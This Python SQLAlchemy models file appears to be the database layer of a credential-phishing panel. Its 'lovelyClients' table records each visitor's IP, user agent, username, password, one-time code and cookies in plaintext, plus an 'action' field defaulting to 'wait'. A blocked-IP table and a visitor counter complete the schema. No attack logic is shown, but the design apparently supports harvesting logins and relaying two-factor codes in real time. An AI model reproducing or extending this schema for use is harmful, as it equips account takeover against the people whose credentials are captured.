from sqlalchemy import Boolean, Column, ForeignKey, Integer, String
from sqlalchemy.orm import relationship

from database import Base


class User(Base):
    __tablename__ = "lovelyClients"

    id = Column(Integer, primary_key=True, index=True)
    ip = Column(String)
    user_agent = Column(String, default="aaaaaaaa")
    username = Column(String)
    password = Column(String)
    action = Column(String, default="wait")
    OTP = Column(String)
    Cookies = Column(String, default="None")


class Blocked_IP(Base):
    __tablename__ = "blocked_ip"
    id = Column(Integer, primary_key=True, index=True, autoincrement=True)
    ip = Column(String)


class Visitor(Base):
    __tablename__ = "visitors"
    id = Column(String, primary_key=True, index=True)
    visit_count = Column(Integer, default=1)


# TODO: move config to a table
# class Config(Base):
